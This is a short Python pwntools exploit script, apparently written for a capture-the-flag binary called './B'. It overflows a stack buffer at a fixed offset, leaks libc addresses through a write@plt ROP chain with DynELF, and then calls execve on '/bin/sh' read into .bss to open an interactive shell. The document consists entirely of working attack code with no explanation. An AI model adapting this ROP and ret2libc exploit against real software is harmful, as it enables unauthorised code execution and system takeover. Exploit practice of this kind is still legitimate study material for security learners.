from pwn import *

p=process('./B')
binary=ELF('./B')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

Input=binary.symbols['input']
write_plt=binary.plt['write']
read_plt=binary.plt['read']
main=binary.symbols['main']
bss=binary.bss();
pppr=0x080487b9
offset=112

print p.recvuntil('~\n');
def leak(addr):
	payload=offset*'Y'+p32(write_plt)+p32(Input)+p32(1)+p32(addr)+p32(4)
	p.sendline(payload)
	data=p.recv(4)
	return data;
	
	
d=DynELF(leak,main,elf=binary)
exe=d.lookup('execve','libc')
payload=offset*'Y'+p32(read_plt)+p32(pppr)+p32(0)+p32(bss)+p32(8)+p32(exe)+p32(1)+p32(bss)+p32(0)+p32(0)
raw_input("1")
p.sendline(payload)
p.sendline('/bin/sh\0')
p.interactive();








